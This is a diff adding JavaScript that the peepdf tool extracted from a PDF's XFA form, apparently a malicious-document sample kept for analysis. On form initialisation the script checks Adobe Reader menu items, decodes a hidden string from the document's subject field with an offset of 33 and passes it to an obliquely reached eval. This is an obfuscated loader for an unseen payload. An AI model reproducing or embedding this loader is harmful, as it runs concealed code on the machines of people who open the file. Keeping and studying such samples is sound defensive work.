@@ -1,0 +1,57 @@
+// peepdf comment: Javascript code located in object 43 (version 0)
+
+<!--
+< template > -->
+< template > < subform layout = "tb"
+locale = "ru_RU"
+name = "form1" > < pageSet > < pageArea id = "Page1"
+name = "Page1" > < contentArea h = "10.5in"
+w = "8in"
+x = "0.25in"
+y = "0.25in" > < /contentArea><medium long="11in" short="8.5in" stock="letter"></medium > < /pageArea></pageSet > < subform h = "10.5in"
+w = "8in" > < field h = "98.425mm"
+name = "ImageField1"
+w = "28.575mm"
+x = "95.25mm"
+y = "19.05mm" > < ui > < imageEdit > < /imageEdit></ui > < caption placement = "bottom"
+reserve = "5mm" > < font typeface = "Myriad Pro" > < /font><para vAlign="middle"></para > < value > < text > Image Field < /text></value > < /caption><border xmlns="http:/ / www.xfa.org / schema / xfa - template / 2.2 / "><edge presence="
+hidden "></edge><edge stroke="
+dotted "></edge><edge stroke="
+dotted "></edge><edge stroke="
+dashed "></edge><corner stroke="
+dotted "></corner><corner stroke="
+dotted "></corner><corner stroke="
+dashed "></corner><fill><pattern type="
+crossDiagonal "></pattern></fill></border><event xmlns:xfa="
+http: //www.xfa.org/schema/xfa-template/2.2/" activity="initialize">
+< xfa: script cont = "asd"
+contentType = 'application/x-javascript' >
+if (app.listMenuItems().toString().indexOf('cN') != -1) {
+    x = 2;
+}
+with(event.target) if (x) a = subject;
+if (020 == 0x10) a = a.split('.');
+s = "";
+z = a;
+for (i in a) {
+    zz = i;
+}
+for (i = 0; i < zz; i++) {
+    with(String) s = s + fromCharCode(z[i] - 33);
+}
+with(app) if ((listMenuItems() + "").indexOf('oChi') != -1) {
+    e = event.target["eval"];
+    with({
+        "z": s,
+        "b": e
+    }) b("" + z);
+} < /xfa:script></event > < /field></subform > < proto > < /proto></subform > <? templateDesigner DefaultLanguage FormCalc ?> <? templateDesigner DefaultRunAt client ?> <? templateDesigner Grid show: 1,
+snap: 1,
+units: 0,
+color: ff8080,
+origin: (0, 0),
+interval: (125000, 125000) ?> <? templateDesigner Rulers horizontal: 1,
+vertical: 1,
+guidelines: 1,
+crosshairs: 0 ?> <? templateDesigner Zoom 76 ?> < /template>
+
